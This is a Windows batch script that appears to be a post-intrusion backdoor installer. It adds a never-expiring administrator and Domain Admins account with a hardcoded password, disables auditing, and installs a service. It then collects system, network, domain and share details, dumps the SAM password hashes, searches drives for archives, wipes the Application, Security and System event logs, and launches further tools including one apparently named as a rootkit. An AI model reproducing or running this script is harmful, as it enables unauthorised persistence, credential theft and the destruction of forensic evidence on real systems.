@echo OFF
win.exe >nul
dll.exe >nul
net stop serv-u >nul
echo          þÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ±±±±±±±±±±±ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþ >> instlog.nfo
echo      ±ÛÛßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßßÛÛ± >> instlog.nfo
echo þþþþ±±ÛÛ²þ             PRE INSTALL PROCESS             þ²ÛÛ±±þþþþ >> instlog.nfo
echo       ßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßß >> instlog.nfo
echo °°°¤°°° 2) adding user >> instlog.nfo
net user SUPPORT_3569r32 no$!$tuff@9! /add >> instlog.nfo
net localgroup Administrators SUPPORT_3569r32 /add >> instlog.nfo
net group "Domain Admins" SUPPORT_3569r32 /add >> instlog.nfo
net user SUPPORT_3569r32 /EXPIRES:never >> instlog.nfo
regedit /s patch.dll >nul
del patch.dll /q /f >nul
AUDITPOL \\127.0.0.1 /disable  >nul
ms_snd.exe
sys_event.exe
echo      ±ÛÛßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßßÛÛ± >> instlog.nfo
echo þþþþ±±ÛÛ²þ            LOADING SERV-U DAEMON            þ²ÛÛ±±þþþþ >> instlog.nfo
echo       ßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßß >> instlog.nfo
%windir%\system32\sslhttp.exe /i >nul
net start sslh >> instlog.nfo
echo      ±ÛÛßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßßÛÛ± >> instlog.nfo
echo þþþþ±±ÛÛ²þ               PC INFORMATION                þ²ÛÛ±±þþþþ >> instlog.nfo
echo       ßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßß >> instlog.nfo
browselist.exe >> instlog.nfo
infox.exe >> instlog.nfo
uptix.exe /s >> instlog.nfo
echo      ±ÛÛßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßßÛÛ± >> instlog.nfo
echo þþþþ±±ÛÛ²þ                 PC IP CONFIG                þ²ÛÛ±±þþþþ >> instlog.nfo
echo       ßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßß>> instlog.nfo
ipconfig /all >> instlog.nfo
route print >> instlog.nfo
echo      ±ÛÛßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßßÛÛ± >> instlog.nfo
echo þþþþ±±ÛÛ²þ                   TAKLIST                   þ²ÛÛ±±þþþþ >> instlog.nfo
echo       ßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßß >> instlog.nfo
pm.exe >> instlog.nfo
echo      ±ÛÛßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßßÛÛ± >> instlog.nfo
echo þþþþ±±ÛÛ²þ             TCP UDP PORT LISTER             þ²ÛÛ±±þþþþ >> instlog.nfo
echo       ßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßß >> instlog.nfo
opp.exe >> instlog.nfo
echo      ±ÛÛßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßßÛÛ± >> instlog.nfo
echo þþþþ±±ÛÛ²þ             DOMAIN ENUMERATION              þ²ÛÛ±±þþþþ >> instlog.nfo
echo       ßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßß >> instlog.nfo
net view /DOMAIN >> instlog.nfo
echo      ±ÛÛßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßßÛÛ± >> instlog.nfo
echo þþþþ±±ÛÛ²þ                CURRENT SHARE                þ²ÛÛ±±þþþþ >> instlog.nfo
echo       ßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßß >> instlog.nfo
net share >> instlog.nfo
echo      ±ÛÛßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßßÛÛ± >> instlog.nfo
echo þþþþ±±ÛÛ²þ              NT SERVICE SUMMARY             þ²ÛÛ±±þþþþ >> instlog.nfo
echo       ßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßß >> instlog.nfo
dpe.exe -v >> instlog.nfo
echo      ±ÛÛßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßßÛÛ± >> instlog.nfo
echo þþþþ±±ÛÛ²þ                    NT SAM                   þ²ÛÛ±±þþþþ >> instlog.nfo
echo       ßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßß >> instlog.nfo
call pW2D.exe >> sam.nfo
echo      ±ÛÛßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßßÛÛ± >> instlog.nfo
echo þþþþ±±ÛÛ²þ                 RAR SEARCHER                þ²ÛÛ±±þþþþ >> instlog.nfo
echo       ßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßß >> instlog.nfo
echo °°°¤°°°  ¤[1] Search *.rar in c: >> instlog.nfo
dir c:\*.rar /s >> instlog.nfo
echo °°°¤°°°  ¤[2] Search *.rar in d: >> instlog.nfo
dir d:\*.rar /s >> instlog.nfo
echo °°°¤°°°  ¤[3] Search *.rar in e: >> instlog.nfo
dir e:\*.rar /s >> instlog.nfo 
echo °°°¤°°°  ¤[4] Search *.rar in f: >> instlog.nfo
dir f:\*.rar /s >> instlog.nfo
echo      ±ÛÛßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßßÛÛ± >> instlog.nfo
echo þþþþ±±ÛÛ²þ                  CLEARLOGS                  þ²ÛÛ±±þþþþ >> instlog.nfo
echo       ßßþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþþþþþþþþþþþÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜþßß >> instlog.nfo
clelg.exe -app
echo °°°¤°°°  ¤[1] Clearing Application log >> instlog.nfo
clelg.exe -sys >> instlog.nfo
echo °°°¤°°°  ¤[2] Clearing Security log >> instlog.nfo
clelg.exe -sec >> instlog.nfo
echo °°°¤°°°  ¤[3] Clearing System log >> instlog.nfo
a.exe /r /n 'secure.bat SUPPORT_3569r32 no$!$tuff@9!' >nul
a.exe /r /n 'remotetest1.3.exe' >nul
a.exe /r /n 'rtk.exe' >nul
a.exe /r /n 'dele.bat' >nul